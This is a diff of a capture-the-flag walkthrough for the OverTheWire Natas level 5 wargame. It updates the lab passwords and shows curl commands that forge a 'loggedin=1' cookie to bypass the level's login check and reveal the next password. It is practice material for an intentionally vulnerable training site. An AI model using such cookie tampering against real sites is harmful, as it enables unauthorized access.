@@ -9,7 +9,7 @@ weight: 6
 | info | value |
 |:-----|------:|
 | user | `natas5` |
-| pass | `0n35PkggAPm2zbEpOU802c0x0Msn1ToK` |
+| pass | `e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M` |
 | host | `http://natas5.natas.labs.overthewire.org` |
 
 ---
@@ -30,14 +30,14 @@ with curl, we may view the current http-header of the page by passing the `-I`/`
 
 ```sh
 curl -I http://natas5.natas.labs.overthewire.org \
--u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK
+-u natas5:e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M
 ```
 
 you may now find the `set-cookie` http value set to `0`. to change that, send a request via the `-b`/`--cookie` parameter with the appropriate values
 
 ```sh
 curl http://natas5.natas.labs.overthewire.org \
--u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK --cookie "loggedin=1"
+-u natas5:e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M --cookie "loggedin=1"
 ```
 
 the same behavior can be achieved when changing the application > cookies value of `loggedin` to 1
@@ -45,7 +45,7 @@ the same behavior can be achieved when changing the application > cookies value 
 ```html
 <h1>natas5</h1>
 <div id="content">
-    Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
+    Access granted. The password for natas6 is 7mhjtShJAcld2NYbKHEadnhEwRn2P8VT
 </div>
 ```
 
